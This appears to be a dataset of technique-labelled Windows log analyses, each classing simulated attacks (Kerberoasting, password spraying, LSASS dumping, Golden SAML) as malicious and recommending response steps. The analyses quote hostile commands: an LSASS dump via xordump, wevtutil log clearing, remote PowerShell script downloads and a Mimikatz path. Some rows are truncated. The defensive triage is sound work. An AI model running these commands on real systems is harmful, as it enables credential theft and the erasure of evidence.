   - A suspicious PowerShell script execution was observed, downloading and executing a script from a remote source (`https://raw.githubusercontent.com/.../dumper.ps1`), which is indicative of potential malware or backdoor execution. This was logged across various PowerShell event logs and Sysmon logs.

5. **Network Logon with NTLM Authentication (`EventID: 4624`)**
   - The admin account `admin_test` was logged in using NTLM authentication from an external workstation name `DESKTOP-3HL5B2P`. This could imply lateral movement within a network and should be investigated further.

6. **Potential Malware Execution (`Windows Defender Update`)**
   - Though Windows Defender is active and a definition update occurred, the suspicious PowerShell activity suggests that adversaries may attempt to bypass security measures.

Based on these observations, I am confident in confirming the following resolution:

- **Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Initiate Incident Response protocols immediately.
- Isolate the affected machine (Server002) from the network to prevent potential propagation.
- Conduct a forensic analysis on the host to identify and understand the scope of the compromise.
- Check for any indications of persistence mechanisms that attackers may have established.
- Review access logs to track any unauthorized access, especially from `DESKTOP-3HL5B2P`.
- Revise and strengthen authentication mechanisms and ensure logging is centrally aggregated and monitored to avoid loss of log data due to local clearing.
- Conduct a full security sweep of the network to identify if other systems may be affected."
Password spray all Azure AD users with a single password,"Based on the analysis of the provided Windows event logs, several indicators suggest potentially malicious activity:

1. **PowerShell Activity**: The logs show the execution of a PowerShell script that attempts to perform password spraying against Azure AD accounts. The script uses a hardcoded password (""P@ssw0rd!"") to try and authenticate against multiple user accounts, as seen in the entry for PowerShell event records and the command line used in logs.

2. **Clearing of Event Logs**: Multiple entries indicate the clearing of the Windows Security and System event logs (Event ID 1102 in Security logs and Event ID 104 in the System logs). This behavior is often associated with attempts to cover tracks following malicious activities.

3. **High Privilege Usage**: The actions were executed with high integrity level privileges, indicative of their potential for causing significant impact if malicious.

Given these observations, there are strong signs of potentially harmful actions being taken on this machine. The combination of automated scripting attack attempts using PowerShell and the clearing of event logs points toward an intentional effort to breach security.

### Resolution: MALICIOUS

#### Recommendations:
- **Immediate Containment**: Isolate the affected host from the network to prevent any further malicious activities.
- **Incident Response**: Initiate a detailed forensic investigation on the isolated host to determine the scope of the compromise and gather evidence.
- **Log Review and Monitoring**: Implement enhanced monitoring for any other systems that might show similar patterns.
- **Security Measures**: Tighten access controls and audit usage of high privilege accounts, especially for actions performed with admin privileges.
- **User Awareness**: Train users on active cybersecurity threats such as password spraying and ensure best practices for password security."
Access Saved Credentials via VaultCmd,"Upon analyzing the provided Windows event logs, several indicators of potentially suspicious activity have been identified:

1. **Event Log Clearing**: 
   - Security log EventID 1102 and System log EventID 104 indicate that the event logs were cleared by the user 'admin_test'. Clearing logs is often an indicator of malicious activity, specifically an attempt to cover tracks.

2. **Time Manipulation**:
   - Security log EventID 4616 shows time changes performed by 'svchost.exe', a known process that can be exploited for malicious purposes.

3. **High-Privilege Logon and Privilege Escalation**:
   - Security log EventID 4624 shows a high-privileged logon using NTLM authentication from a remote workstation. Combined with EventID 4672 that lists numerous high-level privileges, this could indicate a compromise aiming at performing unauthorized administrative actions.

4. **Command Execution**:
   - Sysmon log entries show executions of legitimate system utilities (e.g., `wevtutil.exe`, `cmd.exe`, and `vaultcmd.exe`) which can be used maliciously for credential theft or system manipulation.

5. **Use of `cmd.exe` to Invoke `vaultcmd.exe`**:
   - Sysmon log indicates a `cmd.exe` process executing a `vaultcmd.exe` with specific parameters to list Windows Credentials. This action is frequently associated with attempts to harvest credentials.

Given these log details, there are strong indicators pointing towards malicious activity. The sequence of operations includes log clearing, time manipulation, high-privileged logons, and command execution patterns typical of a compromise scenario.

The resolution for this assessment is: **MALICIOUS**.

### Recommended Actions:
- Initiate an immediate investigation to assess and contain the breach.
- Inspect the 'admin_test' user account for unauthorized modifications or use.
- Conduct a thorough system audit and review access logs for other instances of anomalous activity.
- Consider resetting potentially compromised credentials and strengthen authentication mechanisms.
- Review and strengthen logging and monitoring to detect future similar attempts and reduce the impact of log clearing.
- Consult with incident response experts or teams to handle further forensics and recovery tasks."
CertUtil ExportPFX,"### Analysis:

1. **Application Log**:
   - The entries indicate activities involving **edgeupdate** and **Microsoft-Windows-Security-SPP**. The ""Service stopped"" events are common and do not inherently indicate suspicious activity. These seem routine.

2. **Sysmon Log**:
   - There is a **pattern of usage with `wevtutil.exe`, `conhost.exe`, and `whoami.exe`,** executed by user 'admin_test'. `wevtutil` is used to clear logs, which can be suspicious behavior, especially when executed multiple times across different logs (Application, System, Security).
   - An entry shows `powershell.exe` running a potentially harmful script from a GitHub URL and using `certutil.exe` which is known for download and encode capabilities. This specific activity is highly suspicious since it mimics known malicious behaviors by downloading a script and interacting with certificates.
   - The presence of the `RemoteCertTrust.ps1` script is particularly suspicious, suggesting execution of potentially malicious operations.

3. **Security Log**:
   - The logs show an **unexpected time change** which could be indicative of tampering and obfuscation attempts. 
   - **Security logs were cleared**, which is commonly associated with attempts to cover tracks after improper or illicit actions.
   - Elevated privileges like `SeDebugPrivilege` and others are granted to `admin_test`, which aligns with potential malicious privilege escalation.

4. **System Log**:
   - **System logs were cleared**, again indicating potential obfuscation or conceal the malicious activity.
   - Further corroborates with the activities seen in the security log, evidencing inappropriate access and attempts to cover tracks.

5. **Windows PowerShell Log**:
   - Activities confirm the execution of a potentially malicious script as noted earlier in Sysmon logs using `powershell.exe`. The `certutil.exe` usage is aligned with TTPs (Tactics, Techniques, and Procedures) of known threats involving phishing, web-based, or fileless attacks.
   - The specific invocation through PowerShell (`IEX`, `IWR`) is a major red flag for code execution from a remote location.

### Assessment:

- The combination of executing potentially harmful scripts, clearing of logs, unexpected time changes, and the invocation of suspicious PowerShell commands strongly suggests that malicious activities are occurring.
- The execution of external scripts and use of administrative privileges to clear logs and conduct potentially malicious actions corroborates suspicious intent.

### Conclusion:

Based on the analysis of these logs, the following resolution is determined:

**MALICIOUS** - The presence of activities that resemble known malicious techniques and behaviors (clearing of logs, invocation of potentially dangerous scripts, and suspicious use of system tools) indicates malicious activity. Immediate action is recommended to isolate the system from the network, conduct in-depth forensic analysis, and perform a thorough review and cleansing of security policies and accounts, especially focusing on `admin_test` activities."
Create Volume Shadow Copy with WMI,"After analyzing the provided event logs from the Windows machine, the following observations were made:

1. **Log Cleared Events:**
   - Multiple log clearing events have been recorded in the logs:
     - Event ID 1102 in Security log shows that the security log was cleared by `admin_test`.
     - Event ID 104 in the System log indicates that the system log was cleared by the same user.
     - Another Event ID 104 shows that the Windows PowerShell log was cleared by `admin_test`.
   - Clearing event logs is a suspicious activity, often associated with attempts to cover tracks of malicious actions. This can be a sign of a malicious user trying to remove evidence of their actions.

2. **Shadow Copy Creation:**
   - A shadow copy was created with the command `wmic shadowcopy call create Volume=C:\` as seen in the Sysmon logs involving `cmd.exe`. Shadow copy creation is typically benign but can be used by attackers to steal data or create backups before encrypting files in ransomware scenarios. The execution here is linked with `admin_test` and not a standard backup process, which raises suspicion.

3. **Event Clearing for Sysmon Logs:**
   - Sysmon logs show usage of `wevtutil.exe` commands that cleared different operational logs, including `Microsoft-Windows-Sysmon/Operational` and others (Event IDs 545, 552, and more).
   - The command used was `wevtutil.exe cl <log>`. This activity aligns with attempts to cover evidence.

4. **High-Integrity Processes:**
   - The logs show the `admin_test` user running processes with high integrity levels. Although the user is an admin, the frequency and nature of the processes suggest that elevated privileges might be used for unauthorized actions.

5. **Anomalous Time Change:**
   - Event IDs 4616 in the Security log show time changes, which could be attempts to revert or adjust system times alongside potentially planned malicious actions.

6. **Special Privileges Assigned:**
   - Event ID 4672 in the Security log indicates that special privileges, including `SeDebugPrivilege` and `SeBackupPrivilege`, were assigned to the SYSTEM user. While these are common on system startup, the log-clearing following these may indicate misuse.

Based on these findings, the resolution for this analysis is:

- **MALICIOUS**: The logs contain malicious activities. The frequent log clearing, creation of shadow copies outside of administrative maintenance times, anomalous time changes, and the command executions by the `admin_test` point to actions that are consistent with malicious behavior and attempts to cover tracks. Immediate security measures should be taken, including conducting a thorough investigation of the `admin_test` user activities, checking for unauthorized data access, ensuring no backdoors or malware are installed, and enhancing the monitoring/audit settings to capture such events promptly in the future."
BrowserStealer (Chrome - Firefox - Microsoft Edge),"### Detailed Analysis:

1. **Process Execution Analysis**:
   - **svchost.exe**: Executed under the SYSTEM account, which is typical for this process. No immediate anomalies in its execution.
   - **powershell.exe**: There are multiple instances of PowerShell usage by the user **SERVER002\\admin_test**. Notably, one command line includes what appears to be data exfiltration or manipulation of Firefox browser data (`key4.db` and `logins.json`). This is suspicious as it could be an indication of credential theft.
   - **wevtutil.exe**: There are multiple uses of this utility to clear event logs (Security and System channels), which is often a sign of an attempt to cover tracks post-intrusion.
   - **WHOAMI.EXE and HOSTNAME.EXE**: Usage does not inherently indicate malicious behavior; however, in conjunction with the other activities, they might suggest an attacker identifying system and user environments.

2. **Log Clearing Events**:
   - Security Event ID 1102 and System Event ID 104 indicate that logs were cleared by the user **admin_test**. Log clearing is a significant red flag, especially when coupled with PowerShell scripts targeting sensitive user data.

3. **Windows PowerShell Activity**:
   - The PowerShell command initiated by **SERVER002\\admin_test** is highly suspicious. It seems to involve accessing and modifying browser-related files, often indicative of malicious intent such as harvesting sensitive data or credentials.

4. **Security and Application Log Overview**:
   - Windows Defender was active during the events, but there is no indication from these logs if it detected the suspicious activities. The absence of any alert on the Defender side may indicate evasion tactics or lack of detection rules for this specific activity.

### Assessment:

- **Suspicious PowerShell Activity and Log Clearing**: The combination of suspicious PowerShell activity involving file manipulation in user directories, particularly targeting data usually associated with authentication, and the clearing of event logs suggests an attempt to hide potentially malicious behavior.
- **Credential Theft Indicators**: The manipulation of Firefox profiles and exfiltration to a designated payload directory strongly indicate malicious activity with the potential goal of credential theft.

### Resolution:

- **Resolution: MALICIOUS**

### Guidance on How to Proceed:
- **Immediate Actions**:
  - Isolate the affected machine (Server002) from the network to prevent further potential exfiltration or lateral movement.
  - Preserve all evidence, including network traffic captures if available, for forensic investigation.
- **Forensic Investigation**:
  - Conduct a forensic analysis on the system to ascertain the extent of the breach, including looking for additional payloads or evidence of persistence mechanisms.
  - Check other systems in the network for similar patterns to ensure no further compromise.
- **Remediation**:
  - After investigation and clearance, securely reset all credentials associated with the detected suspicious activity.
  - Review the incident and improve security measures, such as tighter monitoring of PowerShell activity, especially involving high-level accounts.

  - Notify relevant stakeholders of the security incident as per organizational policies, and consider involving legal or compliance departments if required.

This assessment concludes that the observed activities are likely linked to a malicious event involving potential credential theft and system compromise, warranting immediate incident response measures."
Offline Credential Theft With Mimikatz,"In analyzing the provided Windows event logs, several points of interest and potentially suspicious activities emerge:

1. **Event Log Clearing**: 
   - There are multiple log entries indicating that Windows event logs for the `System`, `Security`, and `Windows PowerShell` channels were cleared. These events are captured under `EventID 104` in the System log and `EventID 1102` in the Security log. The activity was performed by the user `admin_test`.
   - Log clearing can be a common tactic employed by attackers to cover their tracks and is inherently suspicious unless conducted as part of routine maintenance or authorized activities.

2. **Command Prompt and PowerShell Execution**:
   - There is a `Sysmon` event with `EventID 1` indicating execution of `cmd.exe` with a command-line argument: `cmd.exe /c ""if not exist %tmp%\lsass.DMP (exit /b 1)""`. This command is trying to check for the existence of a dump file of the LSASS process, which could indicate an attempt to dump credentials. 
   - This process was started by `admin_test` via a PowerShell command, suggesting potential misuse of the `PowerShell` for executing commands that could facilitate credential theft.

3. **Use of `wevtutil.exe`**:
   - Multiple events show the use of `wevtutil.exe` to clear event logs, such as `System`, `Application`, `Security`, and `Sysmon`. This tool is commonly used for legitimate purposes to manage event logs but can also be utilized by attackers to erase visibility of their actions.

4. **Other Process Executions**:
   - Other utility programs like `hostname.exe`, `whoami.exe`, and `taskhostw.exe` were executed. These might be used for reconnaissance purposes within a compromised environment (e.g., to gather environment detail or verify current user access).

5. **User Accounts and Privileges**:
   - All activities are associated with the user `SERVER002\admin_test`, operating with a high integrity level, suggesting that actions were performed with elevated privileges.

**Assessment**:
- The sequence of event logs demonstrate indicative behaviors of post-exploitation activities consistent with credential theft and log clearing, typical of an attacker trying to persist undetected within the system.

**Resolution**:
- MALICIOUS - The combination of event log clearing, suspicious command execution intended to check for credential dumping, and the consistent use of high privilege user account `admin_test` indicates malicious activity.

**Guidance**:
- Immediate containment: Isolate the affected system `Server002` from the network to prevent further internal threats.
- Deep forensic analysis: Conduct a thorough investigation of the system, including memory and disk forensics.
- User account audit: Verify the legitimacy and recent activities of the `admin_test` account.
- Review and enhance security measures to prevent recurrence, including stricter logging and monitoring, especially for high privilege accounts and sensitive operations.
- Incident response: Follow up with incident response protocols, potentially involving an external security team for further analysis and containment."
Request for service tickets,"Upon reviewing the logs provided, several indicators suggest potential malicious activity. Here's a breakdown of the findings:

1. **Event Logs Clearing**: 
   - The Security log (Event ID 1102) shows that the event logs were cleared by the user ""admin_test"". This action is a strong indicator of malicious activity, as adversaries often clear logs post-compromise to hide their presence.
   - The System log (Event ID 104) also shows that logs in the ""System"" and ""Windows PowerShell"" channels were cleared, again by the user ""admin_test"".

2. **PowerShell Activity**:
   - There are multiple instances of PowerShell being executed. The command used included downloading a script from ""https://raw.githubusercontent.com/EmpireProject/Empire/..."", specifically invoking ""Invoke-Kerberoast.ps1"". This indicates the use of the Empire post-exploitation framework, which is widely used for malicious activity.
   - The command-line argument used with PowerShell includes the execution of a Kerberoasting attack, which is a common technique to extract Kerberos tickets to crack password hashes offline.

3. **Process Execution and Anomalies**:
   - The use of ""wevtutil.exe"" to clear various log channels such as ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", and ""Security"" suggests an attempt to disrupt the log generation or to cover tracks.
   - The Sysmon logs reinforce this behavior with the high-frequency, sequential clearing of these logs and the use of system utilities, consistent with malicious intent to discard log traces.

4. **Integrity Level and Privilege**:
   - The integrity level of the processes involved in the PowerShell execution and log clearing activities is high, implying the actions were performed with elevated privileges, fitting a malicious profile.

5. **Time Alteration Events**:
   - System timestamps being adjusted (Event ID 4616) could be a sign of evading detection by creating confusion in the log timeline.

**Assessment and Conclusion**:
- Given the combination of PowerShell execution demonstrating potential exploit activities, extensive log clearing, and high-integrity level command executions, these logs are consistent with malicious behavior that suggests a compromise has occurred.

**Resolution**: MALICIOUS.

**Guidance**:
1. Immediately isolate the affected host (""Server002"") from the network to prevent further propagation or data exfiltration.
2. Conduct a full network and host-based forensic investigation to identify the extent of the compromise.
3. Review user privileges and password policies, particularly for the ""admin_test"" account.

Golden SAML,"**Analysis of Windows Event Logs**:

1. **Security Log**:
   - **Event ID 1102**: This event indicates that the Security log was cleared. The action was performed by the user ""admin_test"". This behavior is often suspicious, as malicious actors may clear logs to cover their tracks after unauthorized activities.

2. **System Log**:
   - **Event ID 104**: Shows logs from the System and Windows PowerShell channels were cleared by the user ""admin_test"". Similar to clearing Security logs, this action is often performed to remove traces of potentially malicious activities.

3. **Windows PowerShell Log**:
   - Numerous entries related to the execution of PowerShell with a specific script using **AADInternals**. This module is known for its capabilities to conduct ""Golden SAML"" attacks, which involve generating manipulation tokens to impersonate users.
   - The specific PowerShell commands appear to generate a SAML token with parameters indicative of a setup that could be used for unauthorized access or impersonation within a federated authentication system.
   - This behavior is highly indicative of malicious activity, especially in conjunction with the clearing of event logs.

4. **Sysmon Log**:
   - The logs reflect multiple scenarios where the `wevtutil.exe` command is used to clear event logs (`cl` flag), consistent with the cleared logs observed in the Security and System logs.
   - Processes such as `powershell.exe` and `conhost.exe` are used along with specific command-line arguments that support the observed malicious PowerShell activities.
   - Execution of `svchost.exe` by `NT AUTHORITY\\SYSTEM` appears normal for system processes and is not flagged here as suspicious.

5. **Command Execution**:
   - Critical logs were cleared using specific command line utilities executed by ""admin_test"". This suggests that the user account might have been compromised or misused.

**Assessment**:

- The combination of these activities—namely the PowerShell usage with potentially malicious scripts and the subsequent clearing of logs—strongly indicate malicious intent.
- The use of AADInternals in the context observed is commonly associated with sophisticated attacks on authentication systems.

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
- Immediately isolate the affected system (""Server002"") from the network to prevent further unauthorized access.
- Conduct a thorough review of user activity, focusing on ""admin_test"", to determine the extent of the compromise and identify other potentially affected systems.
- Reset all credentials and review privilege allocations, especially administrative credentials and roles.
- Analyze network traffic for abnormal patterns of data exfiltration or unauthorized access attempts.
- Consider engaging digital forensics experts to assess data integrity and further investigate the incident.
- Apply security patches and updates to fortify the environment against similar attacks in the future.
- Strengthen monitoring solutions to include advanced threat detection measures for ongoing and future threat mitigation."
Password Spray (DomainPasswordSpray),"Upon reviewing the provided Windows event logs, several indicators suggest potential malicious activity. Here's the detailed analysis:

### Observations:

1. **PowerShell Activity:**
   - There are multiple entries in the Windows PowerShell log where a script known as `DomainPasswordSpray.ps1` has been executed. This script is specifically designed to perform password spraying attacks, indicating a potential compromise.
   - Command-line execution involves the use of `Invoke-DomainPasswordSpray` with the password `Spring2017`, targeting the domain `$Env:USERDOMAIN`.

2. **Security Log:**
   - Event ID 1102 shows the security log was cleared by a user with the username `admin_test`. Clearing the security log is a common tactic used by attackers to hide their tracks.
   - Privilege escalation is hinted at by multiple high-privilege tokens being granted to `admin_test` in Event ID 4672, including privileges like `SeDebugPrivilege`, `SeSecurityPrivilege`, etc.

3. **System Log:**
   - Similar to the security log, the system log registry was cleared around the same time, further signaling an attempt to obscure actions undertaken on the machine.

4. **Sysmon Log:**
   - The use of `wevtutil.exe` to clear logs (`""wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational`) is a red flag, as this utility can be used to clear event logs, including security logs.
   - Frequent launching of system utilities like `whoami`, `hostname`, and other system calls could indicate reconnaissance activities to gather information about the host and user environment.

5. **Event Timestamps:**
   - Several events have conflicting timestamps or timestamps that do not logically follow sequence, possibly indicative of time manipulation attempts (e.g., Event ID 4616 where the `NewTime` is earlier than the `PreviousTime`).

### Assessment:

The log entries demonstrate typical tactics, techniques, and procedures (TTPs) consistent with a credential access attack using password spraying and clearing logs to maintain stealth, aligning with potential malicious actions. Specifically, the execution of a known password spraying script, combined with the clearing of security logs and granting unnecessary privileges, strongly indicates malicious activity.

### Resolution:

Resolution: **MALICIOUS**

### Guidance:

1. **Immediate Action:**
   - Isolate the affected system from the network to prevent further malicious activity.
   - Preserve the logs and any other evidence for further forensic investigation.
   - Conduct a comprehensive review of user `admin_test` activities to determine intent and scope of the compromise.

2. **Long-term:**
   - Review and potentially revoke privileges granted to any high-risk accounts during this period, especially `admin_test`.
   - Implement stricter PowerShell execution policies and monitor script execution more robustly.
   - Enhance logging and monitoring to detect and alert on similar activities in the future, such as excessive log clearing and unauthorized privilege escalations.
   - Educate employees about password hygiene and implement multi-factor authentication to reduce the risk of password spray attacks."
Rubeus kerberoast,"Upon reviewing the provided Windows event logs, several indicators suggest that there is potentially malicious activity taking place on the host:

1. **Unusual PowerShell Activity**:
   - The PowerShell log entries indicate the execution of a script that utilizes `rubeus.exe` for Kerberoasting, a technique used to extract service account hashes from the Active Directory for offline password cracking. The command-line usage of `rubeus.exe` within temporary directories (`C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\\ExternalPayloads`) is a strong indicator of active directory attacks. The presence of `klist purge` suggests a clearing of Kerberos tickets, typically suspicious behavior when seen in conjunction with `rubeus.exe`.

2. **Event Log Clearing**:
   - Activities indicate that security, application, and system log files have been cleared (`wevtutil.exe` usage with the `cl` command). The clearing of logs (`EventID 1102` in Security and `104` in System) is a common tactic used to hide malicious activities and executed by the user `admin_test`.

3. **Sysmon Logs**:
   - Processes being spawned under high integrity level (suggesting elevated privileges) and with a parent process involving `wsmprovhost.exe` and `wevtutil.exe`. These processes are associated with event log clearing and potentially indicate privilege escalation or abuse of administrative utilities.

4. **Process Execution Patterns**:
   - The processes executed and logged, such as `cmd.exe`, `whoami.exe`, and administration utilities like `wevtutil.exe`, indicate an unauthorized exploration of system environment and security.
   - The use of temporary directories and potentially rogue executables (`rubeus.exe`) suggest an execution environment being leveraged for offensive security operations.

Based on the above observations, the following conclusions can be drawn:

- **Condition Assessment**: 
  - **MALICIOUS**: The behavior observed is consistent with known attack patterns involving credential harvesting via Kerberoasting, log file tampering, and a clear intent to cover tracks by log clearance. 

- **Recommendations**:
  - Immediate containment of the server to prevent further spread or data leakage.
  - Conduct a full memory and disk analysis to ensure all malicious artifacts are identified.
  - Change all credentials and potentially affected accounts, especially those with administrative privileges.
  - Review access logs and perform a threat hunt across the environment to identify any other compromised systems or accounts.
  - Strengthen logging and monitoring for early detection of such activities in the future.
  
This analysis underscores the need for urgent remediation actions to address the security breach and mitigate future risks. Ensure that all security protocols are followed during recovery, including preserving forensic evidence for further investigation or legal actions."
Extract Windows Credential Manager via VBA,"Upon reviewing the provided Windows event logs, several anomalies and indicators suggest potential malicious activity:

1. **Security Log Clearance (EventID 1102 and 104)**:
   - The logs show the security, system, and Windows PowerShell logs were cleared by the user `admin_test`. This is highly suspicious as log clearing attempts are often associated with malicious activity meant to hide traces.

2. **Time Manipulation (EventID 4616)**:
   - System time change events occurred, which were reverted to an earlier time. This is a known tactic to potentially evade certain time-based detections or to align timestamps of logs with different narratives.

3. **PowerShell Execution (PowerShell Log, EventID 600)**:
   - The PowerShell logs show a suspicious script being downloaded and executed from the URL `https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1`. This is a known red team technique for simulating malicious activity and is associated with executing potentially harmful macros.

4. **Sysmon Logs (EventID 1 and 5)**:
   - Recording of process creations reflects multiple executions of `wevtutil.exe` for log clearance (`cl` flag usage). The `wevtutil` utility is used for log management and its usage here aligns with active log clearing efforts.
   - A PowerShell process by `admin_test` executed suspicious scripts as mentioned before.

Given these observations:
- The evidence from log clearance, system time manipulation, and suspicious PowerShell activity points towards a potential compromise or at a minimum a simulation of such activity intended to test security controls and responses. 
- The combination of these events, particularly the execution of known offensive scripts, increases the risk of malicious intent.

**Conclusion: MALICIOUS**

**Guidance**:
1. **Immediate Containment**: Isolate the affected system to prevent potential lateral movement.
2. **Detailed Examination**: Conduct forensic analysis on the machine, particularly focusing on the `admin_test` account's actions and recent file changes or network activity.
3. **Incident Response**: Initiate incident response protocols to determine scope, impact, and any further indicators of compromise.
4. **Review and Strengthen Logging**: Ensure that policy prohibits unnecessary log clearance, and consider mechanisms to alert on such activities.
5. **Training and Awareness**: Revisit training for users regarding the handling and detection of suspicious activity.

This assessment highlights a critical security incident that requires an urgent response to ensure network and data integrity."
Dump LSASS.exe using imported Microsoft DLLs,"Upon reviewing the event logs provided, here is a detailed analysis of the suspicious and potentially malicious activity detected:

### Suspicious or Malicious Activity Identified

1. **Log Clearing Activity**:
   - **System Log**: Events with IDs 104 indicate the system and Windows PowerShell event logs were cleared, executed by the user ""admin_test"". 
   - **Security Log**: Event ID 1102 shows the security log was cleared by the same user.

   The clearing of logs is a common tactic used by malicious actors to cover their tracks after conducting unauthorized or malicious activity. This action, especially when performed on all major log channels (System, Security, PowerShell), is highly suspicious.

2. **Use of `wevtutil` Command**:
   - **Sysmon Log**: Multiple instances of `wevtutil.exe` are logged, indicating the clearing of event logs for various channels (Sysmon, Application, System, Security, and Windows PowerShell). The use of `wevtutil cl` to clear logs is indicative of an attempt to erase traces of operations, further suggesting malicious intent.

3. **Execution of Potentially Malicious PowerShell Script**:
   - **Sysmon and PowerShell Logs**: The execution of PowerShell with the command line `powershell.exe & {C:\Windows\Temp\xordump.exe -out C:\Windows\Temp\lsass-xordump.t1003.001.dmp -x 0x41}` is concerning. This command suggests an attempt to dump the memory of LSASS, which can be used to extract credentials (a known tactic for lateral movement and credential harvesting).

### Assessment and Resolution

Based on the analysis of the logs, there is clear evidence of potentially malicious activity:

- The concerted effort to clear logs suggests an individual intending to hide their tracks.
- The command executed via PowerShell, aimed at dumping LSASS memory, aligns with known malicious behaviors focused on obtaining sensitive credentials.

### Resolution: MALICIOUS

Given the actions observed—clearing of logs, combined with executing a questionable PowerShell command targeting LSASS to dump memory—the activities indicate a deliberate attempt to obfuscate malicious operations on the system. This requires immediate attention.

### Recommended Actions

1. **Immediate Containment**: Isolate the affected host (Server002) from the network to prevent further spread or exfiltration of data.
   
2. **Investigation**: Conduct a thorough forensic investigation to understand the full scope of the incident, including how the attacker gained access and if other systems are compromised.

3. **Credential Review and Reset**: Ensure all credentials potentially affected (especially those stored in LSASS) are reviewed and reset.

4. **SIEM and Monitoring Adjustments**: Set alerts for similar activities (log clearing, commands targeting LSASS, etc.). Ensure logging at all endpoints is intact and cannot be easily compromised.

5. **Security Awareness and Training**: Reiterate the importance of recognizing signs of suspicious activities and incidents to the security and IT teams, ensuring swift reporting and response in the future.

By taking these steps, further damage can be mitigated, and future incidents may be averted."
Brute Force Credentials of single Azure AD user,"Based on the analysis of the provided Windows event logs, the following findings and conclusions can be made:

1. **Suspicious Use of PowerShell**: There was a PowerShell command executed from the user `SERVER002\admin_test` that attempted to brute-force AzureAD credentials by trying multiple passwords against an account `bruce.wayne@contoso.com`. The PowerShell command used various password attempts in a loop, indicating a potential credential stuffing or brute-force attack. This activity is clearly malicious.

2. **Clearing of Event Logs**: Multiple logs indicate that the `wevtutil.exe` command was used to clear the System, Application, and Security event logs. The execution of this utility to clear logs without proper justification is often used by attackers to cover up their tracks, which is highly suspicious.

3. **System Integrity**: Multiple logs were cleared by the same user (`admin_test`). This action is particularly suspicious due to its timing, synchronous with the PowerShell brute-force attack, which raises concerns about unauthorized access and potential data tampering.

4. **High Integrity Level**: The processes performing these actions were running with a high integrity level, suggesting that the `admin_test` user has significant privileges on this system. If this was a legitimate administrative action, there should ideally be an appropriate justification or correlation with user activity logs.

Based on the analysis:

- **Assessment**: The logs indicate suspicious and potentially malicious activities. The PowerShell script for brute-forcing credentials and the subsequent log-clearing activities point towards a possible security compromise or insider threat.

- **Resolution**: **MALICIOUS**. The activities observed within these logs are consistent with actions taken by an attacker to breach and maintain unauthorized access to a system, including attempts to hide their actions by clearing logs.

**Guidance on How to Proceed:**
- Immediately isolate the system from the network to prevent further unauthorized access.
- Conduct a full forensic analysis to understand the extent of the breach, including reviewing any other systems accessed by the user `admin_test`.
- Review network logs and authentication logs for signs of other malicious or unauthorized activities.
- Consider resetting credentials for any impacted accounts, including the potentially compromised `bruce.wayne@contoso.com`.
- Evaluate and possibly increase logging and monitoring to detect similar activities in the future.
- Advise on implementing a stronger policy regarding log management and review to prevent unauthorized clearing of logs."
Export Certificates with Mimikatz,"Upon analyzing the provided Windows event logs from Server002, several suspicious behaviors and potential indicators of compromise stand out:

1. **Clearing of Event Logs:**
   - In the Security log, Event ID 1102 was recorded, indicating that the security log was cleared. The user responsible for this action was ""admin_test"".
   - In the System log, Event ID 104 was recorded twice, indicating that both the System and Windows PowerShell logs were cleared by ""admin_test"". Clearing of logs can be an attempt to hide malicious activities.

2. **Unusual Command Execution:**
   - There is a command execution of `wevtutil.exe` used to clear multiple event logs (Microsoft-Windows-Sysmon/Operational, Application, System, and Security). This utility is often used by attackers to cover their tracks by deleting event logs.
   - The execution of `cmd.exe` with the command line mentioning `mimikatz.exe` indicates a potentially malicious activity. Mimikatz is a well-known tool used for credential dumping and other malicious activities. The presence of Mimikatz suggests that there could have been an attempt to extract credentials from the system.

3. **High Integrity Level and Privileged Actions:**
   - The operations are carried out with a high integrity level, indicating administrative privileges which are often required for actions like clearing event logs.
   - The Sysmon logs show these actions performed under the user ""admin_test,"" indicating a possible compromised administrative account.

Given these points, the logs show a clear pattern of behavior associated with malicious activity, including credential dumping and evidence tampering by clearing logs. This analysis concludes:

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

Crafting Active Directory silver tickets with mimikatz,"The provided logs reveal several indicators of potentially malicious activity, warranting a classification as MALICIOUS. Let's break this down:

### Suspicious or Anomalous Behavior:
1. **Command Execution**: 
   - **`cmd.exe` Execution with Mimikatz Reference**: 
     The Sysmon log entry shows `cmd.exe` being launched with a command-line argument that echoes a path associated with `mimikatz.exe`. Mimikatz is a known tool used for extracting plaintext passwords, hashes, PINs, and Kerberos tickets from memory, which is often used by adversaries for lateral movement and credential harvesting.

     ```json
     {""Image"":""C:\\Windows\\System32\\cmd.exe"",""CommandLine"":""\""C:\\Windows\\system32\\cmd.exe\"" /c echo C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe""}
     ```

2. **Log Clearance Activity**:
   - Multiple entries indicate the clearing of various Windows Event Logs (Security, Sysmon, PowerShell, and others). This action is characterized by:
     - **Security Log (Event ID 1102)**
     - **System Log (Event ID 104)**
     - **Windows PowerShell Log Clearance**
   - Clearing logs is a technique often used by attackers to cover their tracks and remove evidence of malicious activities.

### Indicators of Compromise:
- The presence of Mimikatz in any form within a system is almost always considered nefarious unless used by security professionals in a controlled, authorized manner for testing purposes.
- The log clearing events closely follow the PowerShell execution and cmd execution. This suggests a deliberate effort to execute potentially harmful operations and immediately clear logs to remove evidence of these executions.

### Conclusion:
The correlation of these activities indicates intentional misuse of the system tools and capabilities, consistent with someone attempting to perform privilege escalation or maintain persistence covertly within the system. The combination of these indicators such as mimikatz reference and log clearing attempts solidifies the classification of these logs as MALICIOUS.

### Recommended Actions:
1. **Immediate System Isolation**: Disconnect the compromised host from the network to prevent further spread of the attack.
2. **Incident Response Engagement**: Engage your incident response team to perform deeper forensic analysis and full scope assessment of the compromise.
3. **Credential Audit**: Reset all potentially exposed credentials, especially those of privileged accounts, and perform a full audit of account activities.
4. **Review and Harden Security Posture**: Implement enhanced logging, monitoring, and alerting. Strengthen defenses such as deploying endpoint detection and response (EDR) solutions.
5. **User and System Alert**: Notify users and management of the potential breach and enhance user security training to recognize phishing attempts and suspicious activities."
Credential Dumping with NPPSpy,"### Analysis and Findings

Upon reviewing the provided event logs, there are multiple indicators of potentially malicious activity that warrant a closer investigation. Here’s a detailed breakdown:

1. **Security Log (Event ID 1102)**: 
